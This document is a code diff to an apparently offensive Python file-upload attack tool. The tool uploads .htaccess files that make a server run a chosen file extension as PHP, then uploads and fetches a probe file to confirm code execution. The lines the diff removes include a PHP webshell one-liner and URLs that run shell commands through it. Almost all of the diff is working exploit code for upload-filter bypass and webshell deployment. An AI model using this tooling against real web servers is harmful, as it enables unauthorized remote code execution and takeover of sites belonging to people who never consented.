@@ -7,8 +7,11 @@ extension bypass, MIME type manipulation, webshell deployment,
 """
 
 import json
+import random
 import re
+import string
 from typing import Optional, Tuple
+from urllib.parse import urljoin
 
 import requests
 
@@ -890,14 +893,29 @@ class FileUploadTool:
         timeout: int,
         data: dict,
     ) -> str:
-        """Upload .htaccess file to enable PHP execution on image files."""
-        results = ["[FileUploadTool] .htaccess Upload Attack", "=" * 50]
+        """Upload .htaccess AND verify PHP execution with a probe file.
 
-        target_ext = data.get("target_ext", ".jpg").strip()
-        if not target_ext.startswith("."):
-            target_ext = "." + target_ext
+        Without verification, a 200 OK on the .htaccess upload tells us
+        nothing — the directive might be ignored (nginx, AllowOverride
+        None, ExecCGI off). This method uploads .htaccess with a random
+        target extension, immediately uploads a tiny PHP probe with that
+        extension, and fetches the probe to confirm PHP execution.
+        Reports execution_confirmed: true|false with a diagnostic
+        next_action.
+        """
+        results = ["[FileUploadTool] .htaccess Upload + Verification", "=" * 50]
 
-        # Try multiple .htaccess payloads
+        # Use a random 4-char extension unless the caller explicitly set
+        # one. A random suffix avoids collisions with stale .htaccess
+        # state across repeated probes on the same target.
+        explicit_ext = data.get("target_ext", "").strip()
+        if explicit_ext:
+            target_ext = (
+                explicit_ext if explicit_ext.startswith(".") else "." + explicit_ext
+            )
+        else:
+            target_ext = "." + "".join(random.choices(string.ascii_lowercase, k=4))
+
         payloads_to_try = [
             ("addtype", f"AddType application/x-httpd-php {target_ext}"),
             (
@@ -917,7 +935,6 @@ class FileUploadTool:
 
         for name, payload in payloads_to_try:
             try:
-                # Upload .htaccess with EXACT filename
                 status, text, _ = self._upload_file(
                     url,
                     file_param,
@@ -928,42 +945,97 @@ class FileUploadTool:
                     headers,
                     timeout,
                 )
-
-                is_success = self._check_upload_success(status, text, 200)
-                if is_success:
+                if self._check_upload_success(status, text, 200):
                     successful.append((name, payload, status))
                     results.append(f"[+] SUCCESS: {name} (Status: {status})")
                 else:
                     results.append(f"[-] FAILED: {name} (Status: {status})")
-
             except Exception as e:
                 results.append(f"[!] ERROR: {name} - {e}")
 
         results.append("")
         results.append("=" * 50)
+        results.append("=== upload_htaccess verification ===")
 
-        if successful:
-            results.append(f"[+] {len(successful)} payload(s) uploaded successfully!")
-            results.append("")
-            results.append("=== Next Steps ===")
-            results.append(f"1. Upload a PHP webshell with {target_ext} extension:")
-            results.append(f"   Filename: shell{target_ext}")
-            results.append("   Content: <?php system($_GET['cmd']); ?>")
-            results.append("")
-            results.append("2. Access the shell:")
-            results.append(f"   /uploads/shell{target_ext}?cmd=id")
-            results.append(f"   /images/shell{target_ext}?cmd=cat /flag.txt")
-            results.append("")
-            results.append("=== Successful Payloads ===")
-            for name, payload, status in successful:
-                results.append(f"\n--- {name} ---")
-                results.append(payload)
+        if not successful:
+            results.append("htaccess_status: rejected")
+            results.append("execution_confirmed: false")
+            results.append(
+                "next_action: All .htaccess payloads were rejected "
+                "(403 or failure response). Possible causes: "
+                ".htaccess uploads blocked by a denylist, the file is "
+                "renamed on upload, or AllowOverride is None. Consider "
+                "operation=upload_polyglot or a different attack vector."
+            )
+            return "\n".join(results)
+
+        results.append("htaccess_status: uploaded")
+
+        # Run the PHP execution probe.
+        probe_token = "".join(
+            random.choices(string.ascii_lowercase + string.digits, k=8)
+        )
+        probe_filename = f"probe_{probe_token}{target_ext}"
+        # Split the marker across string concatenation so the full token
+        # only assembles when PHP runs. The raw source never contains
+        # "HTACCESS_OK_<token>_" as a contiguous substring — so echoing
+        # the source back does NOT trigger the marker check.
+        probe_body = f'<?= "HTACC" . "ESS_OK_{probe_token}_" . phpversion(); ?>'
+        expected_marker = f"HTACCESS_OK_{probe_token}_"
+        probe_url: Optional[str] = None
+        execution_confirmed = False
+
+        try:
+            probe_status, probe_text, _ = self._upload_file(
+                url,
+                file_param,
+                probe_filename,
+                probe_body.encode("utf-8"),
+                "application/octet-stream",
+                extra_data,
+                headers,
+                timeout,
+            )
+            if self._check_upload_success(probe_status, probe_text, 200):
+                probe_url = self._extract_upload_path(probe_text)
+                if probe_url and not probe_url.startswith("http"):
+                    # Resolve relative to the upload URL's origin.
+                    probe_url = urljoin(url, probe_url)
+                if probe_url is None:
+                    # Fallback: common upload dirs.
+                    probe_url = urljoin(url, f"/uploads/{probe_filename}")
+
+                try:
+                    get_resp = self.session.get(probe_url, timeout=timeout)
+                    body = getattr(get_resp, "text", "") or ""
+                    execution_confirmed = expected_marker in body
+                except Exception as e:
+                    results.append(f"[!] probe fetch failed: {e}")
+        except Exception as e:
+            results.append(f"[!] probe upload failed: {e}")
+
+        if probe_url is not None:
+            results.append(f"probe_url: {probe_url}")
+        results.append(
+            f"execution_confirmed: {'true' if execution_confirmed else 'false'}"
+        )
+
+        if execution_confirmed:
+            results.append(f"active_extension: {target_ext}")
+            results.append(
+                f"next_action: Upload your PHP payload with extension "
+                f"'{target_ext}' via operation=upload_custom. All files "
+                f"with that extension now execute as PHP on the server."
+            )
         else:
-            results.append("[-] No payloads succeeded. Possible reasons:")
-            results.append("  - .htaccess files are blocked")
-            results.append("  - File renamed on upload (not kept as .htaccess)")
-            results.append("  - AllowOverride is disabled on server")
-            results.append("  - Try upload_custom with exact filename '.htaccess'")
+            results.append(
+                "next_action: .htaccess was accepted by the upload endpoint "
+                "but PHP execution did NOT engage. Probable causes: "
+                "(1) Apache AllowOverride None in the target directory, "
+                "(2) nginx backend (htaccess is ignored entirely), "
+                "(3) the upload directory has ExecCGI/Options disabled. "
+                "Consider operation=upload_polyglot or pivot to LFI."
+            )
 
         return "\n".join(results)
 
